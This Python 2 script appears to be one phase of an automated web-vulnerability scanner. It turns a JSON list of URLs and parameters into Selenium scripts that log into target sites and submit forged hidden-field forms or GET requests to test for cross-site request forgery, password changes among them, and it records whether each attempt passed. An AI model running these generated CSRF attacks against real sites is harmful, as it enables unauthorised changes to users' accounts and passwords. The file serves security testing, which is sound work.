#!/usr/bin/python

from urls import URLs
from collections import OrderedDict
import os
import argparse
import copy
import sys
import urlparse
import subprocess
import json

html_file_name = 'formtemplate'
sh_file_name = 'runall.sh'

# This will generate a html file and a python script
# The python script will run selenium which will post the form html file to inject the CSRF exploit
# python phase4.py -o outfile-name -j json-file

def phase4(argv):
    parser = argparse.ArgumentParser()
    parser.add_argument('-j','--json', help='JSON file name',required=True)
    parser.add_argument('-o','--output',help='Output file name', required=True)
    args = parser.parse_args()
        
    json_file = args.json
    output_file = args.output

    print "json file = " + json_file + " outfile = " + output_file

    if not os.path.isfile(json_file):
        print 'Wrong input!!!'
        print 'Please input like: phase4.py -j <json file> -o <outputfile>'
        sys.exit(-1)

    # Get Json_data
    with open(json_file) as json_input:
        json_data = json.load(json_input)

    items = copy.deepcopy(URLs).items()
    index = 0

    generate_shell_files(sh_file_name, json_data, output_file, index, items)


def generate_shell_files(sh_file_name, json_data, output_file, index, items):
    action = ''
    sh_file = open(sh_file_name, 'w')
    sh_file.write("#!/bin/sh\n")
    sh_file.write('\n## Shell File to run all the test case to generate output.log\n')

    login_url_tests = []
    for url in json_data.keys():
        new_entry = 0
        print "Current URL is " + url
        for data in json_data[url]:
            itr = {}
            if isinstance(data, dict):
                itr = data
            else:
                itr = data[0]
            is_change_password = False

            methods = itr['method']
            params = itr['params']
            if len(data) > 1:
                try:
                    nextparam = data[1]
                    if nextparam:
                        action = nextparam['params']
                except KeyError:
                    pass
            else:
                action = None

            if "mypassword" in str(list(params.iteritems())):
                is_change_password = True

            py_filename = output_file + '_' + repr(index) + '.py'
            print "Python FileName:: " + py_filename

            if new_entry == 0:
                login_url, form_data, login_xpath = get_login_info(url, items)

            if action:
                for k, v in action.iteritems():
                    extension_url = k + '=' + v
                exploit_url = url + '?' + extension_url
            else:
                exploit_url = url

            if not login_url:
                print "no Login URL: failed!!"
                continue

            print "login url: " + login_url
            if login_xpath:
                print "login xpath: " + login_xpath

            generate_python_script(py_filename, exploit_url, methods, params, login_url, form_data, login_xpath, index,
                                     is_change_password)
            login_url_tests.append((py_filename, exploit_url, methods, params))
            index += 1
            new_entry = 1

    orderd = OrderedDict()
    orderd[None] = []
    orderd["group"] = []
    orderd["mypassword"] = []

    for filename, exploit_url, methods, params in login_url_tests:
        added = False
        for okey in orderd:
            if okey is None:
                continue
            if okey in str(list(params.iteritems())) or okey in exploit_url:
                orderd[okey].append((filename, exploit_url, methods, params,))
                added = True
                break
        if not added:
            orderd[None].append((filename, exploit_url, methods, params,))

    login_url_tests = reduce(lambda x, y: x + y, orderd.values(), [])
    # print "final Explict" + login_url_tests
    # vefiry(login_url_tests, sh_file)
    sh_file.close()


def vefiry(login_url_tests, sh_file):
    seen_params = set()
    for filename, exploit_url, methods, params in login_url_tests:
        current_params = set(params.keys())
        count = len(seen_params.intersection(current_params))
        if count == len(current_params):
            continue

        p = subprocess.Popen(['python', filename], stdout=subprocess.PIPE,
                             stderr=subprocess.PIPE)
        out, err = p.communicate()
        print exploit_url
        if "PASSED" in out:
            print 'PASSED'
            seen_params.update(current_params)
            phase4_json_output(exploit_url, methods, params)
        else:
            print 'FAILED'


def phase4_json_output(url, method, params):
    json_file = "phase4.json"
    json_data = {}

    if os.path.isfile(json_file):
        with open(json_file, "r") as json_file_fp:
            if os.stat(json_file).st_size > 0:
                json_data = json.load(json_file_fp)

    if url in json_data:
        json_data[url].append([{"method": method, "params": params}])
    else:
        json_data[str(url)] = [{"method": method, "params": params}]

    with open(json_file, "w") as outfile:
        json.dump(json_data, outfile, indent=4)


def verify_form_change(py_file):
    py_file.write('\ncur_url = browser.current_url\n')
    py_file.write('after = browser.page_source\n')
    py_file.write("outstr = \"\Exploit URL: \" + url + \" \"" + '\n')
    py_file.write('if before != after:\n')
    py_file.write('\tprint \'### PASSED ###\'\n')
    py_file.write('\tupdate_results(outstr + " PASSED\\n")\n')
    py_file.write('else:\n')
    py_file.write('\tprint \'### FAILED ###\'\n')
    py_file.write('\tupdate_results(outstr + " FAILED\\n")\n\n')


def verify_login_phase(py_file):
    py_file.write('\ncur_url = browser.current_url\n')
    py_file.write('body = browser.page_source\n')
    py_file.write("outstr = \"\Exploit URL: \" + url + \" \"" + '\n')
    py_file.write('result = check_login(body, cur_url, url)\n')
    py_file.write('if result:\n')
    py_file.write('\tprint \'##### PASSED #####\'\n')
    py_file.write('\tupdate_results(outstr + " PASSED\\n")\n')
    py_file.write('else:\n')
    py_file.write('\tprint \'##### FAILED #####\'\n')
    py_file.write('\tupdate_results(outstr + " FAILED\\n")\n\n')


def py_post_method(py_file, injection_url, json_data, index):
    file_name = html_file_name + '_' + `index` + '.html'
    html_file = open(file_name, 'w')
    html_file.write('<form action="' + injection_url + '" method="post">\n')
    # sort = iter(sorted(json_data.iteritems()))
    for k, v in json_data.iteritems():
        html_file.write('<input type="hidden" name="' + k + '" value="' + v + '">\n')

    html_file.write('<input type="submit" value="Submit"></form>\n')
    html_file.close()

    py_file.write('\n\ncur = os.getcwd()\n')
    py_file.write('browser.get(cur + "/' + file_name + '")\n')
    py_file.write('browser.find_element_by_xpath("//input[@type=\'submit\' and @value=\'Submit\']").submit()\n')
    py_file.write('injection_url = \'' + injection_url + '\'\n')
    py_file.write('browser.get(injection_url)\n')
    py_file.write('before = browser.page_source\n')
    py_file.write('browser.quit()\n')


def py_get_method(py_file, injection_url, json_data):
    exploit_url = injection_url

    py_file.write('# execute and verify\n')
    py_file.write('base_url = \'' + injection_url + '\'\n')
    py_file.write('browser.get(base_url)\n')
    py_file.write('before = browser.page_source\n')
    # inject CSRF
    py_file.write('\nurl = \'' + exploit_url + '\'\n')
    py_file.write('browser.get(url)\n')

    # verify exploits
    string = "outstr = \"Exploit URL: \" + url + \" \""
    py_file.write('\nbrowser.get(base_url)\n')
    py_file.write('after = browser.page_source\n\n')
    py_file.write('out_str = "Exploit URL: " + url + " "\n')
    py_file.write(string + '\n')

    py_file.write('if before != after:\n')
    py_file.write('\tprint \'##### PASSED #####\'\n')
    py_file.write('\tupdate_results(out_str + " PASSED\\n")\n')
    py_file.write('else:\n')
    py_file.write('\tprint \'##### FAILED #####\'\n')
    py_file.write('\tupdate_results(out_str + " FAILED\\n")\n\n')


def login_form(py_file, login_url, login_name, login_name_val, login_pwd_name, login_pwd_val, login_xpath):
    # login form
    py_file.write('# Login to the website \n')
    py_file.write('url = \'' + login_url + '\'\n')
    py_file.write('browser.get(url)\n')
    py_file.write('browser.find_element_by_name(\'' + login_name + '\').send_keys(\'' + login_name_val + '\')\n')
    py_file.write('browser.find_element_by_name(\'' + login_pwd_name + '\').send_keys(\'' + login_pwd_val + '\')\n')

    # if there is an xpath, use it.
    # Otherwise find a submit button and submit
    if login_xpath:
        py_file.write('browser.find_element_by_xpath("' + login_xpath + '\").submit()\n')
    else:
        py_file.write('browser.find_element_by_xpath("//input[@type=\'submit\']").submit()\n')

    py_file.write('\n# start executing')


def generate_python_script(filename, url, method, json_data, login_url, data, login_xpath, index, is_change_password):
    key = []
    val = []

    for k, v in data.iteritems():
        key.append(str(k))
        val.append(str(v))

    login_name = str(key[0])
    login_name_val = str(val[0])
    login_pwd_name = str(key[1])
    login_pwd_val = str(val[1])

    print "login_name: " + login_name + " login_name_val: " + login_name_val
    print "login_pwd_name: " + login_pwd_name + " login_pwd_val: " + login_pwd_val

    py_file = open(filename, 'w')

    # driver_name = '/usr/chromedriver'
    py_file.write('import os\n')
    py_file.write('from phase4lib import check_login, update_results\n')
    py_file.write('from selenium import webdriver\n\n')
    py_file.write('browser = webdriver.Firefox("")\n')
    login_form(py_file, login_url, login_name, login_name_val, login_pwd_name, login_pwd_val, login_xpath)

    # for post Method
    if (method == 'POST'):
        py_post_method(py_file, url, json_data, index)
        py_file.write('\n## Verification phase\n')
        py_file.write('browser = webdriver.Firefox("")\n')
        if is_change_password:
            login_form(py_file, login_url, login_name, login_name_val, login_pwd_name, login_pwd_val, login_xpath)
            verify_login_phase(py_file)
        else:
            verify_form_change(py_file)
        print 'For POST related CSRF exploits in url=%s' % url
    else:
        py_get_method(py_file, url, json_data)
        print "For GET related CSRF exploits in url=%s" % url

    py_file.write('browser.quit()\n')
    py_file.close()


# Get the login info from URL dict
def get_login_info(url, items):
    is_user_url = False
    is_admin_url = False
    login_page = ''
    formdata = ''
    xpath = ''

    if url.find('user') >= 0:
        is_user_url = True
    elif url.find('admin') >= 0:
        is_admin_url = True

    print 'json url: ' + url
    for data in items:
        base_url = urlparse.urlparse(data[0]).netloc

        is_user_url = False
        adminURL = False

        if url.find(base_url) < 0:
            continue

        # workaround....
        elif url.find('app4') >= 0:
            is_user_url = False
            adminURL = False

        try:
            name = data[1]["name"]
            if is_user_url:
                if name.find('user') < 0:
                    continue
            if is_admin_url:
                if name.find('admin') < 0:
                    continue
        except KeyError:
            pass
        try:
            need_selenium = data[1]["need_selenium"]
        except KeyError:
            pass
        try:
            login_page = data[1]["login_page"]
        except KeyError:
            print 'No login page for ' + name
            pass

        if need_selenium:
            xpath = data[1]["formxpath"]
            print "this xpath: " + xpath
        else:
            xpath = ''

        formdata = data[1]["formdata"]

        if login_page:
            break


    if not login_page:
        print "No Base URL!! \n"

    return login_page, formdata, xpath

if __name__ == "__main__":
   phase4(sys.argv[1:])